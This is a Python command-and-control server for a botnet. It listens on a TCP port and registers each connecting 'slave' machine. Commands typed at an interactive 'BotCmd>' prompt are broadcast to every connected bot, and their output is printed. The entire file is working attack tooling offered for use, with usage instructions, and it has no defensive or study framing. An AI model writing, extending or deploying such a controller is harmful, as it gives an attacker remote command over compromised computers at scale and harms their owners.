import socket 
import sys
import os 
import time
import threading
import queue

q = queue.Queue()
socket_thread = []
bot_list = {}

# Singleton controller isntance to manage ALL the bots
class bot_cmd_controller(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2
 
    def run(self):
        while True:
            send_cmd = str(input("BotCmd> "))
            if (send_cmd == ""):
                pass
            elif (send_cmd == "exit"):
                for i in range(len(socket_thread)):
                    time.sleep(0.1)
                    self.q.put(send_cmd)
                print("[!] Server will shutdown in 5 seconds")
                time.sleep(5)
                os._exit(0)
            else:
                print("[+] Sending Command: " + send_cmd + " to " + str(len(socket_thread)) + " bots")
                for i in range(len(socket_thread)):
                    time.sleep(0.1)
                    self.q.put(send_cmd)


# Each bot has its own instance of the handler. 
class bot_handler(threading.Thread):
    def __init__(self, client, client_address, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv
 
    def run(self):
        BotName = threading.current_thread().getName()
        print("\n[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", BotName)
        bot_list[BotName] = self.client_address
        while True:
            RecvBotCmd = self.q.get()
            try:
                RecvBotCmd += "\n"
                self.client.send(RecvBotCmd.encode('utf-8'))
                recvVal = (self.client.recv(1024)).decode('utf-8') 
                recvVal += "\n"
                print(recvVal)
            except Exception as ex:
                print(ex)
                break


def listener(host, port, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (host, port)
    server.bind(server_address)
    server.listen(100)
    print ("[+] Starting Botnet listener on tcp://" + host + ":" + str(port) + "\n")
    bot_cmd_thread = bot_cmd_controller(q)
    bot_cmd_thread.start()

    while True:
        (client, client_address) = server.accept()
        new_thread = bot_handler(client, client_address, q)
        socket_thread.append(new_thread)
        new_thread.start()


def main():
    if (len(sys.argv) < 3):
        print ("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[0] + " 0.0.0.0 8080\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as e:
            print("\n[-] Unable to run the handler. Reason: " + str(e) + "\n")


if __name__ == "__main__":
    main()
